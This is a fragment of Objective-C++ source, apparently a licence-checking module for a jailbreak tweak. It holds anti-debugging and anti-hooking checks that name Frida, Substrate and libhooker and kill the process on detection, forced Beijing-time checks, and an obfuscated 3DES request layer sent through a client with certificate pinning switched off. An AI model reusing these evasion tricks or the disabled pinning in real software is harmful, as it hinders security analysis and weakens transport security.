    
    void *v1 = (__bridge void *)(Spv1);
    [arr addObject:(__bridge id)(v1)];
    
    void *v2 = (__bridge void *)(Spv2);
    [arr addObject:(__bridge id)(v2)];
    
    void *v3 = (__bridge void *)(Spv3);
    [arr addObject:(__bridge id)(v3)];
    
    void *v4 = (__bridge void *)(Spv4);
    [arr addObject:(__bridge id)(v4)];
    
    void *v5 = (__bridge void *)(Spv5);
    [arr addObject:(__bridge id)(v5)];
    
    void *v6 = (__bridge void *)(Spv6);
    [arr addObject:(__bridge id)(v6)];
    
    void *v7 = (__bridge void *)(Spv7);
    [arr addObject:(__bridge id)(v7)];
    
    void *v8 = (__bridge void *)(Spv8);
    [arr addObject:(__bridge id)(v8)];
    
    void *v9 = (__bridge void *)(Spv9);
    [arr addObject:(__bridge id)(v9)];
    
    void *v10 = (__bridge void *)(Spv10);
    [arr addObject:(__bridge id)(v10)];
    
    void *v11 = (__bridge void *)(Spv11);
    [arr addObject:(__bridge id)(v11)];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        int name[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
        struct kinfo_proc info;
        size_t info_size = sizeof(info);
        sysctl(name, 4, &info, &info_size, NULL, 0);
        if ((info.kp_proc.p_flag & P_TRACED) != 0) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
#pragma clang diagnostic pop
        }
        
        char *dyld_env = getenv("DYLD_INSERT_LIBRARIES");
        if (dyld_env != NULL) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
#pragma clang diagnostic pop
        }
        
        uint32_t count = _dyld_image_count();
        for (uint32_t i = 0; i < count; i++) {
            const char *name = _dyld_get_image_name(i);
            if (strstr(name, "CydiaSubstrate") || strstr(name, "SubstrateLoader") ||
                strstr(name, "MobileSubstrate") || strstr(name, "FridaGadget") || strstr(name, "libhooker")) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
            }
        }
        const struct mach_header *header = _dyld_get_image_header(0);
        if (!(header->flags & MH_PIE)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        
        NSInteger beijingOffset = [NSTimeZone timeZoneWithName:@"Asia/Shanghai"].secondsFromGMT;
        NSInteger currentOffset = [NSTimeZone localTimeZone].secondsFromGMT;
        BOOL isBeijingTime = (currentOffset == beijingOffset);
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        [formatter setLocale:[NSLocale currentLocale]];
        [formatter setDateStyle:NSDateFormatterNoStyle];
        [formatter setTimeStyle:NSDateFormatterShortStyle];
        NSString *dateString = [formatter stringFromDate:[NSDate date]];
        BOOL is24Hour = ![dateString containsString:@"a"];
        if (!isBeijingTime || !is24Hour) {
            NSString *errorMsg = @"";
            if (!isBeijingTime) errorMsg = @"请前往【设置】→【通用】→【日期与时间】→ 选择【北京时区】";
            if (!is24Hour) errorMsg = [errorMsg stringByAppendingString:@"\n并启用【24 小时制】"];
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"时间错误" message:errorMsg preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
            }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
            [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
#pragma clang diagnostic pop
            return;
        }
        
        void (^ex)(void) = (__bridge void (^)(void))(v0);
        ex();
        
        if (isBlockHooked(Spv0)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv1)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv2)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv3)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv4)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv5)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv6)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv7)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv8)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv9)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv10)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
        if (isBlockHooked(Spv11)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
#pragma clang diagnostic pop
        }
    });
}

static AFHTTPSessionManager *Working = nil;
static inline AFHTTPSessionManager *SpeedClient(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
        if ([config respondsToSelector:NSSelectorFromString(@"setHTTP3Enabled:")]) {
            [config setValue:@(NO) forKey:@"HTTP3Enabled"];
        } else {
            config = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        }
        Working = [[AFHTTPSessionManager alloc] initWithBaseURL:[NSURL URLWithString:@""] sessionConfiguration:config];
        Working.securityPolicy     = [AFSecurityPolicy policyWithPinningMode:AFSSLPinningModeNone];
        Working.responseSerializer = [AFHTTPResponseSerializer serializer];
        Working.requestSerializer  = [AFJSONRequestSerializer serializer];
        Working.requestSerializer.timeoutInterval = 15.0;
        if ([Working respondsToSelector:@selector(setTaskDidFinishCollectingMetricsBlock:)]) {
            __weak AFHTTPSessionManager *weakMgr = Working;
            [Working setTaskDidFinishCollectingMetricsBlock:^(NSURLSession *session, NSURLSessionTask *task, NSURLSessionTaskMetrics *metrics) {
                (void)weakMgr;
            }];
        }
    });
    return Working;
}


@implementation NetTool : NSObject
+ (NSURLSessionDataTask *)Post_AppendURL:(NSArray<NSString *> *)appendURL encryptedParam:(NSString *)encryptedParam tag:(EncryptionType)tag mysuccess:(void (^)(id responseObject, NSString *serverTime))success myfailure:(void (^)(NSError *error, NSString *serverTime))failure {
    
    typedef NSString* (^DeBlock)(NSString *);
    DeBlock DE_3D = ^(NSString *s1) { return SpeedDesEn7De(s1); };
    
    typedef NSDictionary* (^JsBlock)(NSString *);
    JsBlock Js_DE = ^(NSString *s1) {
        if (!s1) return (NSDictionary *)nil;
        NSData *jsonData = [s1 dataUsingEncoding:NSUTF8StringEncoding];
        NSError *error = nil;
        NSDictionary *dictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:kNilOptions error:&error];
        if (error) return (NSDictionary *)nil;
        return dictionary;
    };
    
    NSDictionary *param = Js_DE(DE_3D(encryptedParam));
    if (!param) return nil;
    NSDictionary *parameters = nil;
    NSMutableDictionary *param1 = [NSMutableDictionary dictionary];
    if (param != nil) {
        param1[@"action"] = DE_3D(param[@"action"]);
        param1[@"date"] = DE_3D(param[@"date"]);
        param1[@"id"] = DE_3D(param[@"id"]);
        param1[@"appsafecode"] = DE_3D(param[@"appsafecode"]);
        switch (tag) {
            case EN_Spv2:
                param1[@"one"] = DE_3D(param[@"one"]);
                param1[@"two"] = DE_3D(param[@"two"]);
                break;
            case EN_Spv6:
                param1[@"code"] = DE_3D(param[@"code"]);
                param1[@"serial"] = DE_3D(param[@"serial"]);
                break;
            case EN_Spv9:
                param1[@"JB"] = DE_3D(param[@"JB"]);
                param1[@"V8"] = DE_3D(param[@"V8"]);
                break;
            case EN_Spv10:
                param1[@"deviceserial"] = DE_3D(param[@"deviceserial"]);
                break;
            default:
                break;
        }
        
        NSMutableDictionary *ok = [param1 mutableCopy];
                [ok removeObjectForKey:@"id"];
                
                nlohmann::json jsonParam;
                for (NSString *key in ok.allKeys) {
                    NSString *value = ok[key];
                    jsonParam[[key UTF8String]] = [value UTF8String];
                }
                std::string jsonStr = jsonParam.dump();
                NSString *paramJson = [NSString stringWithUTF8String:jsonStr.c_str()];
                
                parameters = @{
                    @"v1": SpeedDesEn7En(SpeedEn_3DES(SpeedRebellion_en(paramJson, StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))),
                    @"v2": SpeedDesEn7En(SpeediOS_Sign(SpeedDe_3DES(SpeedRebellion_de(Speed_ios_sign, StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(Speed_ios_sign_pass, StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedEn_3DES(SpeedRebellion_en(paramJson, StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))))
                };
    } else {
        syscall(SYS_kill, getpid(), SIGKILL);
        __builtin_trap();
    }
    if (!parameters) parameters = @{};
    
    typedef NSString* (^EnstrBlock)(NSString*, NSInteger);
    EnstrBlock En_Str = ^(NSString *s1, NSInteger shift) {
        NSMutableString *result = [NSMutableString string];
        for (NSUInteger i = 0; i < s1.length; i++) {
            unichar character = [s1 characterAtIndex:i];
            unichar shiftedCharacter = character + shift;
            [result appendFormat:@"%C", shiftedCharacter];
        }
        return result;
    };
    
    typedef NSArray* (^DecryptUrlComponentsBlock)(NSArray *);
    DecryptUrlComponentsBlock DecryptUrlArr = ^NSArray *(NSArray *encryptedComponents) {
        if (!encryptedComponents || encryptedComponents.count < 3) return @[];
        NSMutableArray *decryptedComponents = [NSMutableArray array];
        for (NSString *encryptedString in encryptedComponents) {
            NSString *decryptedString = SpeedDesEn7De(encryptedString);
            [decryptedComponents addObject:decryptedString ?: @""];
        }
        return [decryptedComponents copy];
    };
    NSArray *decryptedComponents = DecryptUrlArr(appendURL);
    if (decryptedComponents.count != 3) {
        syscall(SYS_kill, getpid(), SIGKILL);
        __builtin_trap();
    }
    
    return [SpeedClient() POST:En_Str(param1[@"id"], 5) parameters:parameters urlComponents:decryptedComponents headers:nil parameter:@{@"CustomP": En_Str(decryptedComponents[2], 3), @"Param": @"Akf?"} progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([task.response isKindOfClass:[NSHTTPURLResponse class]]) {
            if (SpeedEn_DJB2([task.response.URL.absoluteString UTF8String]) != HashValue) {
                syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
            }
            if ([task.response.URL.absoluteString isEqualToString:[NSString stringWithFormat:@"%@?id=%@", SpeedDesEn7De(Speed_HOST), md5(SpeedDesEn7De(Speed_appid))]]) {
                NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)task.response;
                NSString *serverTime = [httpResponse.allHeaderFields objectForKey:SpeedDesEn7De(Speed_ServerTimer)];
                if (!serverTime || [serverTime isEqualToString:@""]) {
                    syscall(SYS_kill, getpid(), SIGKILL);
                    __builtin_trap();
                }
                if (success) {
                    success(responseObject, serverTime);
                } else {
                    syscall(SYS_kill, getpid(), SIGKILL);
                    __builtin_trap();
                }
            } else {
                syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
            }
        } else {
            syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSString *serverTime = @"";
        if ([task.response isKindOfClass:[NSHTTPURLResponse class]]) {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)task.response;
            serverTime = [httpResponse.allHeaderFields objectForKey:SpeedDesEn7De(Speed_ServerTimer)];
        } else {
            syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
        }
        if (!serverTime || [serverTime isEqualToString:@""]) {
            syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
        }
        if (failure) {
            failure(error, serverTime);
        } else {
            syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
        }
    }];
}

@end
